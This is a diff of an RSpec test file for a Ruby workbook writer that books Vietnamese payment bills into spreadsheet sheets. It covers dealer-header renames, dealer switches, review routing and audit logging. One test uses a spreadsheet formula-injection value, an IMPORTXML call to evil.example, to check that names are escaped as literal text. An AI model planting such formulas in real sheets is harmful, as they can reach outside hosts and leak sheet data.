@@ -22,15 +22,10 @@ RSpec.describe Workbook::HelloSmcWriter do
         "Lợi nhuận", "Số Lô", "Ngày giao dịch", "Giờ giao dịch", "Tên đại lý", "Tên HKD", "Người đi tiền" ] ]
   end
 
-  def bill_grid
-    [ [ "Tên Đại lý", "Số tiền sau khi trừ phí gốc", "Số tiền giao dịch", "Phí gốc", "Ngày giao dịch", "Trạng thái" ] ]
-  end
-
   def memory(extra = {}, row_limits = {})
     Workbook::MemorySheet.new({
       "DS MB T10" => ds_mb_grid,
-      "MB" => mb_grid,
-      "Bill vô chủ" => bill_grid
+      "MB" => mb_grid
     }.merge(extra), row_limits)
   end
 
@@ -133,6 +128,232 @@ RSpec.describe Workbook::HelloSmcWriter do
     end
   end
 
+  describe "DS MB header changes" do
+    let(:lan) { create(:dealer, name: "Lan") }
+
+    def renamed_grid(header)
+      ds_mb_grid.tap { |grid| grid[0][1] = header }
+    end
+
+    def write(transaction, grid)
+      client = memory("DS MB T10" => grid)
+      [ described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"), client ]
+    end
+
+    def review_reason(transaction)
+      transaction.reload
+      expect(transaction).to be_needs_review
+      expect(WorkbookEntry.where(transaction_id: transaction.id)).not_to exist
+      transaction.source_data["review_reasons"].sole
+    end
+
+    before do
+      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
+    end
+
+    it "writes into the column found by TID and remembers the new header when the same person was renamed" do
+      transaction = build_transaction
+      chuong.update!(name: "Chương Văn")
+
+      result, client = write(transaction, renamed_grid("Chương Văn (tid1)"))
+
+      expect(result).to eq(:identified)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+      expect(link.reload.ds_header).to eq("Chương Văn (tid1)")
+      audit = AuditLog.find_by!(action: "merchant_dealer.ds_header_synced", auditable: link)
+      expect(audit.metadata).to include("from" => "Chương (tid1)", "to" => "Chương Văn (tid1)", "sheet" => "DS MB T10",
+                                        "source" => "writer", "transaction_id" => transaction.id)
+    end
+
+    it "does not touch ds_header or the audit trail when the header already matches" do
+      write(build_transaction, ds_mb_grid)
+
+      expect(link.reload.ds_header).to eq("Chương (tid1)")
+      expect(AuditLog.where(action: "merchant_dealer.ds_header_synced")).to be_empty
+    end
+
+    it "gives the agent row and the bill to the dealer the header now names" do
+      lan
+      transaction = build_transaction(amount: 10_000_000)
+
+      result, client = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:identified)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+10000000")
+      expect(link.reload).to have_attributes(dealer: lan, ds_header: "Lan (tid1)")
+      expect(transaction.reload).to have_attributes(dealer: lan, status: "approved")
+      expect(client.cell("MB", "I2")).to eq("Lan")
+      audit = AuditLog.find_by!(action: "merchant_dealer.agent_switched", auditable: link)
+      expect(audit.metadata).to include("from_dealer" => "Chương", "to_dealer" => "Lan", "source" => "writer",
+                                        "transaction_id" => transaction.id)
+      expect(AuditLog.where(action: "transaction.dealer_reassigned", auditable: transaction)).to exist
+    end
+
+    it "keeps the person on the bill's approval and amounts for the new dealer" do
+      lan
+      approver = create(:user, :operator)
+      transaction = build_transaction
+      transaction.update!(approved_by: approver, approved_at: Time.zone.local(2026, 10, 1, 11, 0))
+
+      write(transaction, renamed_grid("Lan (tid1)"))
+
+      transaction.reload
+      expect(transaction.approved_by).to eq(approver)
+      expect(transaction.approved_at).to eq(Time.zone.local(2026, 10, 1, 11, 0))
+      expect(transaction.applied_dealer_rate).to eq(BigDecimal("0.0121"))
+    end
+
+    it "sends the bill back to review for a name no dealer has, and writes nothing" do
+      transaction = build_transaction
+
+      result, client = write(transaction, renamed_grid("Minh Quân (tid1)"))
+
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
+      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
+      expect(client.cell("MB", "A2")).to be_nil
+      expect(link.reload).to have_attributes(dealer: chuong, ds_header: "Chương (tid1)")
+      expect(AuditLog.where(action: "merchant_dealer.agent_switched")).to be_empty
+    end
+
+    it "does not switch dealers when the setting is off" do
+      lan
+      AppSetting.create!(key: "ds_header_auto_switch", value: "false")
+      transaction = build_transaction
+
+      result, = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_header_dealer_unmatched")
+      expect(link.reload.dealer).to eq(chuong)
+      expect(transaction.reload.dealer).to eq(chuong)
+    end
+
+    it "still follows a plain rename when the setting is off" do
+      AppSetting.create!(key: "ds_header_auto_switch", value: "false")
+      chuong.update!(name: "Chương Văn")
+
+      result, = write(build_transaction, renamed_grid("Chương Văn (tid1)"))
+
+      expect(result).to eq(:identified)
+      expect(link.reload.ds_header).to eq("Chương Văn (tid1)")
+    end
+
+    it "sends the bill back to review when it cannot move to the new dealer" do
+      lan
+      transaction = build_transaction
+      FeeRule.update_all(active: false)
+
+      result, = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("dealer_reassign_failed")
+      expect(transaction.reload.dealer).to eq(chuong)
+    end
+
+    it "moves a bill evaluated before the agent row changed hands to the row's dealer" do
+      transaction = build_transaction
+      transaction.update!(source_data: transaction.source_data.merge(
+        "dealer_resolution" => { "merchant_dealer_id" => link.id }
+      ))
+      link.update!(dealer: lan, ds_header: "Lan (tid1)")
+
+      result, client = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:identified)
+      expect(transaction.reload.dealer).to eq(lan)
+      expect(client.cell("MB", "I2")).to eq("Lan")
+    end
+
+    it "treats a dealer the system set earlier as not chosen by hand" do
+      transaction = build_transaction
+      transaction.update!(source_data: transaction.source_data.merge(
+        "dealer_resolution" => { "merchant_dealer_id" => link.id },
+        "manual_corrections" => [ { "by" => nil, "fields" => [ "dealer_id" ] } ]
+      ))
+      link.update!(dealer: lan, ds_header: "Lan (tid1)")
+
+      write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(transaction.reload.dealer).to eq(lan)
+    end
+
+    it "changes no agent row when the bill cannot be written to DS MB anyway" do
+      lan
+      transaction = build_transaction(at: Time.zone.local(2026, 10, 20, 10, 0))
+
+      result, = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:needs_review)
+      expect(review_reason(transaction)).to eq("ds_cell_missing")
+      expect(link.reload.dealer).to eq(chuong)
+      expect(transaction.reload.dealer).to eq(chuong)
+    end
+
+    it "handles a whole switch: the first bill switches, a bill evaluated before it follows, later bills match" do
+      lan
+      grid = renamed_grid("Lan (tid1)")
+      client = memory("DS MB T10" => grid)
+      resolved = ->(bill) { bill.update!(source_data: bill.source_data.merge("dealer_resolution" => { "merchant_dealer_id" => link.id })) }
+      first = build_transaction(amount: 1_000_000).tap(&resolved)
+      evaluated_before = build_transaction(amount: 2_000_000).tap(&resolved)
+
+      results = [ first, evaluated_before ].map do |bill|
+        described_class.call(transaction: bill, client: client, spreadsheet_id: "sheet-id")
+      end
+      later = create(:transaction, :approved, merchant: merchant, dealer: lan, transaction_amount_vnd: 3_000_000,
+                                              transaction_at: Time.zone.local(2026, 10, 1, 11, 0),
+                                              applied_dealer_rate: BigDecimal("0.0121"), dealer_amount_vnd: 2_963_700,
+                                              source_data: first.source_data)
+      results << described_class.call(transaction: later, client: client, spreadsheet_id: "sheet-id")
+
+      expect(results).to eq(%i[identified identified identified])
+      expect([ first, evaluated_before, later ].map { |bill| bill.reload.dealer }).to all(eq(lan))
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+1000000+2000000+3000000")
+      expect((2..4).map { |row| client.cell("MB", "I#{row}") }).to all(eq("Lan"))
+      expect(AuditLog.where(action: "merchant_dealer.agent_switched").count).to eq(1)
+      expect(AuditLog.where(action: "transaction.dealer_reassigned").count).to eq(2)
+    end
+
+    it "leaves a dealer chosen by hand in review alone" do
+      transaction = build_transaction
+      transaction.update!(source_data: transaction.source_data.merge(
+        "dealer_resolution" => { "merchant_dealer_id" => link.id },
+        "manual_corrections" => [ { "by" => create(:user, :operator).id, "fields" => [ "dealer_id" ] } ]
+      ))
+      link.update!(dealer: lan, ds_header: "Lan (tid1)")
+
+      result, = write(transaction, renamed_grid("Lan (tid1)"))
+
+      expect(result).to eq(:identified)
+      expect(transaction.reload.dealer).to eq(chuong)
+    end
+
+    it "undoes the switch with the bill when the sheet write fails, and switches once on the retry" do
+      lan
+      transaction = build_transaction
+      client = memory("DS MB T10" => renamed_grid("Lan (tid1)"))
+      attempts = 0
+      allow(client).to receive(:batch_update_values).and_wrap_original do |original, *args|
+        attempts += 1
+        raise Faraday::TimeoutError if attempts == 1
+
+        original.call(*args)
+      end
+
+      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
+        .to raise_error(Faraday::TimeoutError)
+      expect(link.reload.dealer).to eq(chuong)
+      expect(transaction.reload.dealer).to eq(chuong)
+      expect(AuditLog.where(action: "merchant_dealer.agent_switched")).to be_empty
+
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+      expect(link.reload.dealer).to eq(lan)
+      expect(AuditLog.where(action: "merchant_dealer.agent_switched").count).to eq(1)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+    end
+  end
+
   describe "DS MB running sum (formula)" do
     def write_with(cell_value)
       grid = ds_mb_grid.tap { |g| g[1][1] = cell_value }
@@ -164,21 +385,20 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(write_with("354.367.000").cell("DS MB T10", "B2")).to eq("=354367000+486000")
     end
 
-    it "books the bill in Bill vô chủ when the day cell holds text it cannot add to" do
+    it "sends the bill back to review when the day cell holds text it cannot add to" do
       client = write_with("ghi chú")
 
       expect(client.cell("DS MB T10", "B2")).to eq("ghi chú")
       expect(client.cell("MB", "A2")).to be_nil
-      expect(client.cell("Bill vô chủ", "C2")).to eq(486_000)
-      expect(WorkbookEntry.last.branch).to eq("unidentified")
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_not_numeric")
+      expect(WorkbookEntry.count).to eq(0)
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
     end
 
     it "does not add to a formula that is not a plain running sum" do
       client = write_with("=SUM(C2:D2)")
 
       expect(client.cell("DS MB T10", "B2")).to eq("=SUM(C2:D2)")
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_not_numeric")
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_not_numeric" ])
     end
 
     it "clears last month's running sums when it builds a new month" do
@@ -192,23 +412,86 @@ RSpec.describe Workbook::HelloSmcWriter do
     end
   end
 
-  describe "unidentified transaction" do
-    it "appends a Bill vô chủ row and leaves the other sheets untouched" do
+  describe "bill the writer cannot place" do
+    # No TID on the bill, and its dealer has no agent row in the HKD to fall back on.
+    def unknown_tid_transaction
+      build_transaction.tap do |transaction|
+        transaction.update!(dealer: create(:dealer, name: "Không có cột"),
+                            source_data: { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } })
+      end
+    end
+
+    it "writes nothing and sends the bill back to review with the reason" do
       client = memory
       allow(client).to receive(:batch_update_values).and_call_original
+      transaction = unknown_tid_transaction
 
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)
+
+      expect(client).not_to have_received(:batch_update_values)
+      expect(WorkbookEntry.count).to eq(0)
+      transaction.reload
+      expect(transaction).to be_needs_review
+      expect(transaction.review_reason_codes).to eq([ "agent_tid_missing" ])
+      expect(transaction.open_review.reason_codes).to eq([ "agent_tid_missing" ])
+      expect(AuditLog.find_by!(action: "transaction.sent_to_review", auditable: transaction).metadata)
+        .to eq("issue" => "agent_tid_missing")
+    end
+
+    it "replaces the reasons settled at approval with the writer's reason" do
+      transaction = unknown_tid_transaction
+      transaction.update!(source_data: transaction.source_data.merge("review_reasons" => [ "merchant_low_confidence" ]))
+
+      described_class.call(transaction: transaction, client: memory, spreadsheet_id: "sheet-id")
+
+      expect(transaction.reload.review_reason_codes).to eq([ "agent_tid_missing" ])
+    end
+
+    it "writes a bill without TID into the only column of the dealer it was approved with" do
       transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.save!
+      transaction.update!(source_data: { "extraction" => { "merchant_name" => "001: HỘ KINH DOANH THIÊN KIM" } })
+      client = memory
 
-      result = described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+      expect(client.cell("MB", "I2")).to eq("Chương")
+    end
 
-      expect(result).to eq(:unidentified)
-      expect(client.cell("Bill vô chủ", "C2")).to eq(486_000)
-      expect(client.cell("Bill vô chủ", "A2")).to eq("KHÔNG RÕ HKD")
-      expect(client.cell("DS MB T10", "B2")).to eq(354_367_000)
-      expect(client).to have_received(:batch_update_values).once
-      expect(WorkbookEntry.count).to eq(1)
+    it "keeps the dealer a confirmed QR paid when a person approves the bill again" do
+      lan = create(:dealer, name: "Lan")
+      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
+      transaction = build_transaction
+      transaction.update!(source_data: transaction.source_data.merge("dealer_resolution" => { "merchant_dealer_id" => link.id }))
+      DealerPaymentQr.create!(recorded_transaction: transaction, dealer: chuong, status: "confirmed", access_token: "paid")
+      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
+
+      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")).to eq(:needs_review)
+      expect(transaction.reload.review_reason_codes).to eq([ "payment_qr_confirmed" ])
+      expect(link.reload.dealer).to eq(lan)
+
+      expect(Transactions::Approver.call(transaction: transaction, actor: create(:user, :operator))).to be(true)
+      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+
+      expect(transaction.reload.dealer).to eq(chuong)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
+      expect(client.cell("MB", "I2")).to eq("Lan") # column I names the agent of the column, as before
+      expect(AuditLog.where(action: "transaction.dealer_reassigned")).to be_empty
+    end
+
+    it "is written once the configuration is fixed and the bill approved again" do
+      transaction = build_transaction
+      client = memory("DS MB T10" => ds_mb_grid.tap { |grid| grid[0][1] = "Lan (tid1)" })
+      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      expect(transaction.reload).to be_needs_review
+
+      lan = create(:dealer, name: "Lan")
+      create(:fee_rule, merchant: merchant, base_fee_rate: BigDecimal("0.0088"), dealer_rate: BigDecimal("0.0121"))
+      expect(Transactions::Approver.call(transaction: transaction, actor: create(:user, :operator))).to be(true)
+
+      expect(described_class.call(transaction: transaction.reload, client: client, spreadsheet_id: "sheet-id")).to eq(:identified)
+      expect(transaction.reload.dealer).to eq(lan)
+      expect(link.reload.dealer).to eq(lan)
+      expect(client.cell("DS MB T10", "B2")).to eq("=354367000+486000")
     end
   end
 
@@ -374,42 +657,20 @@ RSpec.describe Workbook::HelloSmcWriter do
       expect(WorkbookEntry.last.payload["issue"]).to eq("reconciled_after_retry")
     end
 
-    it "does not add a second Bill vô chủ row on retry" do
-      client = memory
-      transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "KHÔNG RÕ HKD" } }
-      transaction.save!
-      calls = 0
-      allow(WorkbookEntry).to receive(:create!).and_wrap_original do |original, *args|
-        calls += 1
-        raise ActiveRecord::StatementInvalid, "db down" if calls == 1
-
-        original.call(*args)
-      end
-
-      expect { described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id") }
-        .to raise_error(ActiveRecord::StatementInvalid)
-      expect(described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id"))
-        .to eq(:already_written)
-      expect(client.cell("Bill vô chủ", "A3")).to be_nil
-      expect(WorkbookEntry.count).to eq(1)
-    end
-
-    it "writes OCR text that looks like a formula as literal text" do
+    it "writes names that look like a formula as literal text" do
       client = memory
       sent = nil
       allow(client).to receive(:batch_update_values).and_wrap_original do |original, updates|
         sent = updates
         original.call(updates)
       end
-      transaction = build_transaction
-      transaction.source_data = { "extraction" => { "merchant_name" => "=IMPORTXML(\"http://evil.example\",\"//a\")" } }
-      transaction.save!
+      chuong.update!(name: "=IMPORTXML(\"http://evil.example\",\"//a\")")
 
-      described_class.call(transaction: transaction, client: client, spreadsheet_id: "sheet-id")
+      described_class.call(transaction: build_transaction, client: client, spreadsheet_id: "sheet-id")
 
-      expect(sent.first[:rows].first.first).to start_with("'=IMPORTXML")
-      expect(client.cell("Bill vô chủ", "A2")).to start_with("=IMPORTXML")
+      mb_row = sent.find { |update| update[:sheet] == "MB" }[:rows].first
+      expect(mb_row[8]).to start_with("'=IMPORTXML")
+      expect(client.cell("MB", "I2")).to start_with("=IMPORTXML")
     end
   end
 
@@ -429,8 +690,8 @@ RSpec.describe Workbook::HelloSmcWriter do
       result = described_class.call(transaction: build_transaction(at: Time.zone.local(2026, 10, 2, 10, 0)),
                                     client: client, spreadsheet_id: "sheet-id")
 
-      expect(result).to eq(:unidentified)
-      expect(WorkbookEntry.last.payload["issue"]).to eq("ds_cell_missing")
+      expect(result).to eq(:needs_review)
+      expect(Transaction.last.source_data["review_reasons"]).to eq([ "ds_cell_missing" ])
       expect(client.cell("DS MB T10", "B7")).to eq(300)
     end
   end
